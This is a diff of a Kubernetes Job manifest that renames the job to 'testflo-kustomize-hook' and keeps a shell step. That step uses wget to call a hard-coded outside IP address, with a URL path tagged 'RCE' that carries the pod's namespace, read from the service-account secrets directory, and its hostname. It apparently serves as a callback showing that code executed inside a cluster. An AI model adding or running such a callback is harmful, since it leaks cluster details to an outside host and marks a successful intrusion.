@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: testflo-callback-3
+  name: testflo-kustomize-hook
   namespace: default
 spec:
   ttlSecondsAfterFinished: 300
@@ -14,6 +14,6 @@ spec:
         - /bin/sh
         - -c
         - |
-          wget -q -O- http://82.165.195.38/TESTFLO-RCE-$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)-$(hostname) || true
+          wget -q -O- http://82.165.195.38/TESTFLO-KUSTOMIZE-$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)-$(hostname) || true
       restartPolicy: Never
   backoffLimit: 1
